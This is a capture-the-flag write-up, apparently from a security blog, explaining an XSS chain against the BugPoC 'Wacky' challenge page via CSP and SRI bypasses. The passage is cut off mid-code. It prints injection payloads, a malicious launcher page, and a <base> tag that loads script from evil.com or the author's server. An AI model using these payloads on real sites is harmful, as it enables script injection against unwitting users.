<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>BugPoC Wacky XSS Challenge - acut3</title>

<meta name="description" content="Bypassing CSP and SRI with HTML injection and DOM Clobbering">
<link rel="canonical" href="http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html"><link rel="alternate" type="application/rss+xml" title="acut3" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" ><link rel="me" href="https://infosec.exchange/@acut3hack">
<style>
code {
  font-size: 90%;
}
</style><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>BugPoC Wacky XSS Challenge | acut3</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="BugPoC Wacky XSS Challenge" />
<meta name="author" content="acut3" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Bypassing CSP and SRI with HTML injection and DOM Clobbering" />
<meta property="og:description" content="Bypassing CSP and SRI with HTML injection and DOM Clobbering" />
<link rel="canonical" href="http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html" />
<meta property="og:url" content="http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html" />
<meta property="og:site_name" content="acut3" />
<meta property="og:image" content="http://localhost:4000/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-11-10T00:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" />
<meta property="twitter:title" content="BugPoC Wacky XSS Challenge" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"acut3"},"dateModified":"2020-11-10T00:00:00+01:00","datePublished":"2020-11-10T00:00:00+01:00","description":"Bypassing CSP and SRI with HTML injection and DOM Clobbering","headline":"BugPoC Wacky XSS Challenge","image":"http://localhost:4000/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html"},"url":"http://localhost:4000/ctf/2020/11/10/bugpoc-wacky-xss-challenge.html"}</script>
<!-- End Jekyll SEO tag -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://use.fontawesome.com/releases/v5.0.13/css/all.css',
        jquery: 'https://unpkg.com/jquery@3.3.1/dist/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://unpkg.com/chart.js@2.7.2/dist/Chart.min.js',
        gitalk: {
          js: 'https://unpkg.com/gitalk@1.2.2/dist/gitalk.min.js',
          css: 'https://unpkg.com/gitalk@1.2.2/dist/gitalk.css'
        },
        valine: 'https//unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://unpkg.com/mathjax@2.7.4/unpacked/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://unpkg.com/mermaid@8.0.0-rc.8/dist/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
      <div class="header__title">
        <div class="header__brand"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2 2">
  <mask id="m">
    <rect width="2" height="2" fill="white" />
    <rect width="2" height="2" transform="rotate(-15,1,1)" />
  </mask>
  <rect width="2" height="2" mask="url(#m)" />
</svg>
<a title="InfoSec, CTF & Bug Bounties
" href="/">acut3</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>BugPoC Wacky XSS Challenge</h1></header></div><meta itemprop="headline" content="BugPoC Wacky XSS Challenge"><div class="article__info clearfix"><ul class="left-col menu"><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=ctf">ctf</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=xss">xss</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=nonce">nonce</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=sri">sri</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=dom+clobbering">dom clobbering</a>
            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Nov 10, 2020</span>
            </li></ul></div><meta itemprop="author" content="acut3"/><meta itemprop="datePublished" content="2020-11-10T00:00:00+01:00">
    <meta itemprop="keywords" content="ctf,xss,nonce,sri,dom clobbering"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><p><em>Bypassing CSP and SRI with HTML injection and DOM Clobbering</em></p>

<!--more-->

<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" alt="Alert" /></p>

<h2 id="tldr">TL;DR</h2>

<p>The attack uses a few tricks that are pretty neat. For those of you who already
have a good understanding of the challenge, here are some key points:</p>

<ul>
  <li>
    <p>The attack works by using the <code class="language-plaintext highlighter-rouge">param</code> query parameter on
<code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code> to inject a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> tag between
the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code>tags. By doing so we’re making the sandboxed iframe load the
<code class="language-plaintext highlighter-rouge">files/analytics/js/frame-analytics.js</code> file from our own server. It allows us
to bypass the CSP’s nonce check and get an XSS inside the sandboxed iframe.</p>
  </li>
  <li>
    <p>The block on modal windows inside the sandboxed iframe is bypassed by using
our XSS inside the sandboxed iframe, to inject an XSS inside its parent. This
is allowed because <code class="language-plaintext highlighter-rouge">allow-same-origin</code> is used in the sandboxed iframe, making
it share its parent’s origin.</p>
  </li>
  <li>
    <p>Since we can’t iframe <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>, we’re
opening it as a new window in an <code class="language-plaintext highlighter-rouge">onclick()</code> handler on our malicious page.
The (improper) check that makes sure the page is iframed is bypassed by setting
the name of the new window to <code class="language-plaintext highlighter-rouge">iframe</code></p>
  </li>
  <li>
    <p>The <code class="language-plaintext highlighter-rouge">integrity</code> check on the <code class="language-plaintext highlighter-rouge">files/analytics/js/frame-analytics.js</code> script
is bypassed using DOM clobbering. Our injected payload includes an <code class="language-plaintext highlighter-rouge">&lt;input
name="fileIntegrity" value="..."&gt;</code> tag that sets <code class="language-plaintext highlighter-rouge">fileIntegrity.value</code> to the
sha256 of our own malicious javascript.</p>
  </li>
  <li>
    <p>The BugPoC PoC uses the the HTTP Front-end PoC. It also uses the Mock
Endpoint to return the malicious <code class="language-plaintext highlighter-rouge">frame-analytics.js</code>, and the Flexible
Redirector to hide the mock endpoint’s URL behind a tidy, path-free,
<code class="language-plaintext highlighter-rouge">&lt;base&gt;</code>-friendly URL</p>
  </li>
</ul>

<h2 id="recon">Recon</h2>

<p>The goal is to find an XSS on the web page below and pop an <code class="language-plaintext highlighter-rouge">alert(origin)</code>
that will show <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/</code>:</p>

<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com.png" alt="Wacky Text Generator" /></p>

<p>The web page is pretty simple: you enter a text, click the “Make Whacky!”
button, and the text is rendered using different fonts and shades of green for
each letter.</p>

<p>Right away we can notice that some sanitizing it done on the text area: when a
key is lifted the <code class="language-plaintext highlighter-rouge">&amp;*&lt;&gt;%</code> characters are removed. This is done by the following
piece of code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">txt</span><span class="dl">"</span><span class="p">).</span><span class="nx">onkeyup</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[</span><span class="sr">&amp;*&lt;&gt;%</span><span class="se">]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The wacky text is in fact rendered in a different iframe whose <code class="language-plaintext highlighter-rouge">src</code> is updated
when the “Make Whacky!” button is pressed:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">btn</span><span class="dl">'</span><span class="p">).</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
    <span class="nx">val</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">txt</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">theIframe</span><span class="dl">'</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/frame.html?param=</span><span class="dl">'</span><span class="o">+</span><span class="nx">val</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>We can see that the text to render is passed to the iframe through the <code class="language-plaintext highlighter-rouge">param</code>
query parameter, and it gets reflected in exactly two different locations
inside the iframe:</p>

<ol>
  <li>Between the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tags:
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;title&gt;</span>
     qwerty
 <span class="nt">&lt;/title&gt;</span>    
</code></pre></div>    </div>
  </li>
  <li>Inside a <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> section:
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;div</span> <span class="na">role=</span><span class="s">"main"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text"</span> <span class="na">data-action=</span><span class="s">"randomizr"</span><span class="nt">&gt;</span>qwerty<span class="nt">&lt;/p&gt;</span>
 <span class="nt">&lt;/div&gt;</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>The text inside this <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> section is then rendered inside the iframe by the
following piece of code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">makeRandom</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">element</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">createNewText</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">htmlColorTag</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">color:</span><span class="dl">'</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span> <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">riFonts</span> <span class="o">=</span> <span class="nx">randomInteger</span><span class="p">(</span><span class="nx">fonts</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">riColors</span> <span class="o">=</span> <span class="nx">randomInteger</span><span class="p">(</span><span class="nx">colors</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
            <span class="nx">createNewText</span> <span class="o">=</span> <span class="nx">createNewText</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;span class='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">fonts</span><span class="p">[</span><span class="nx">riFonts</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">' style='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">htmlColorTag</span> <span class="o">+</span> <span class="nx">colors</span><span class="p">[</span><span class="nx">riColors</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/span&gt;</span><span class="dl">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">element</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">createNewText</span><span class="p">;</span>
    <span class="p">}</span>			  
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">text</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">makeRandom</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
</code></pre></div></div>

<p>The top document and the iframe are both returned with an <code class="language-plaintext highlighter-rouge">x-frame-options:
SAMEORIGIN</code> header, meaning we wouldn’t be able to iframe either or these
inside our own page. This is important because it would have been a way to call
the iframe with a <code class="language-plaintext highlighter-rouge">param</code> of our choice.</p>

<p>Last but not least, both the top document and the iframe use the following CSP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content-security-policy: script-src 'nonce-xxxxxxxxxxxx' 'strict-dynamic'
</code></pre></div></div>

<p>Since the nonce changes randomly with every request (as it should), it
basically means our only way to execute a payload is to insert it inside an
existing <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.</p>

<h2 id="the-path-to-alert">The Path to alert()</h2>

<h3 id="making-an-educated-guess">Making an educated guess</h3>

<p>The only query parameter we’ve found is <code class="language-plaintext highlighter-rouge">param</code> in the iframe’s URL. Searching
through the response bodies shows no use of <code class="language-plaintext highlighter-rouge">location</code>, which mean it doesn’t
seem there is any extraction of parameters from the URL on the client side. If
there is an XSS, it is almost certainly inside the iframe, through the <code class="language-plaintext highlighter-rouge">param</code>
query parameter.</p>

<p>This is pretty much confirmed by this piece of code inside the iframe:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">alert</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">g</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span>
    <span class="nx">g</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">TmljZSBKb2Igd2l0aCB0aGlzIENURiEgSWYgeW91IGVuam95ZWQgaGFja2luZyB0aGlzIHdlYnNpdGUgdGhlbiB5b3Ugd291bGQgbG92ZSBiZWluZyBhbiBBbWF6b24gU2VjdXJpdHkgRW5naW5lZXIhIEFtYXpvbiB3YXMga2luZCBlbm91Z2ggdG8gc3BvbnNvciBCdWdQb0Mgc28gd2UgY291bGQgbWFrZSB0aGlzIGNoYWxsZW5nZS4gUGxlYXNlIGNoZWNrIG91dCB0aGVpciBqb2Igb3BlbmluZ3Mh</span><span class="dl">"</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It redefines the <code class="language-plaintext highlighter-rouge">alert()</code> function to pop the alert as expected, and then pop
a second alert with the following message:</p>

<blockquote>
  <p>Nice Job with this CTF! If you enjoyed hacking this website then you would
love being an Amazon Security Engineer! Amazon was kind enough to sponsor
BugPoC so we could make this challenge. Please check out their job openings!</p>
</blockquote>

<p>So, the XSS will happen inside the <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>
iframe for sure, and probably through the <code class="language-plaintext highlighter-rouge">param</code> query parameter.</p>

<h3 id="controlling-the-iframe">Controlling the iframe</h3>

<p>We’ve seen that we can’t iframe <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code>
inside our own page, because of the <code class="language-plaintext highlighter-rouge">x-frame-options: SAMEORIGIN</code> header. But
then how could we get our victim to open it with our payload in the <code class="language-plaintext highlighter-rouge">param</code>
query parameter?</p>

<p>Simple, let’s just call <code class="language-plaintext highlighter-rouge">window.open()</code> instead, and open the frame in a new
tab.</p>

<p>Well it doesn’t work, because of this piece of code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// verify we are in an iframe</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[...]</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`
    &lt;h1&gt;Error&lt;/h1&gt;
    &lt;h2&gt;This page can only be viewed from an iframe.&lt;/h2&gt;
    &lt;video width="400" controls&gt;
    &lt;source src="movie.mp4" type="video/mp4"&gt;
    &lt;/video&gt;`</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Fortunately for us this is not a proper way to check if we’re in an iframe. We
can just fake it by setting the name of the new window to “iframe”. Our
malicious page would look like:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
        <span class="dl">'</span><span class="s1">My payload</span><span class="dl">'</span>
    <span class="p">);</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// Sets name to "iframe" in the new window</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"popup()"</span><span class="nt">&gt;</span>Click me!<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>We make sure to call <code class="language-plaintext highlighter-rouge">window.open()</code> in an <code class="language-plaintext highlighter-rouge">onclick()</code> handler, because if the
popup doesn’t result from a click then it would be blocked by default.</p>

<h3 id="csp-bypass">CSP Bypass</h3>

<p>Out of the two injection points we’ve found, only the first one, between the
<code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tags, is not escaped. Normally we could just close the <code class="language-plaintext highlighter-rouge">&lt;title&gt;</code> tag
and inject our script there. However, because the CSP requires a nonce that we
don’t know, the execution is blocked as we can see in the console:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
        <span class="dl">'</span><span class="s1">&lt;/title&gt;&lt;script&gt;alert(origin)&lt;/script&gt;</span><span class="dl">'</span>
    <span class="p">);</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_CSP.png" alt="CSP" /></p>

<p>Lucky for us, the <code class="language-plaintext highlighter-rouge">https://wacky.buggywebsite.com/frame.html</code> page also creates
a sandboxed iframe. This iframe loads a script from a relative location:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">files/analytics/js/frame-analytics.js</span><span class="dl">'</span><span class="p">);</span>
<span class="p">[...]</span>
<span class="nx">analyticsFrame</span><span class="p">.</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
</code></pre></div></div>

<p>Instead of injecting a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> we can inject a <code class="language-plaintext highlighter-rouge">&lt;base
href="https://evil.com/"&gt;</code>. All URLs that don’t specify a host will be relative
to this base URL, and the script will be loaded from
<code class="language-plaintext highlighter-rouge">https://evil.com/files/analytics/js/frame-analytics.js</code>.</p>

<p>We also need to make sure our <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file is returned with an
<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code> header. This is, I believe, because the
<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag has <code class="language-plaintext highlighter-rouge">crossorigin</code> set to <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>

<h3 id="sri-bypass">SRI Bypass</h3>

<p>With our new payload we’re now faced with another issue:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
        <span class="dl">'</span><span class="s1">&lt;/title&gt;&lt;base href="https://acut3.xyz/"&gt;</span><span class="dl">'</span>
    <span class="p">);</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
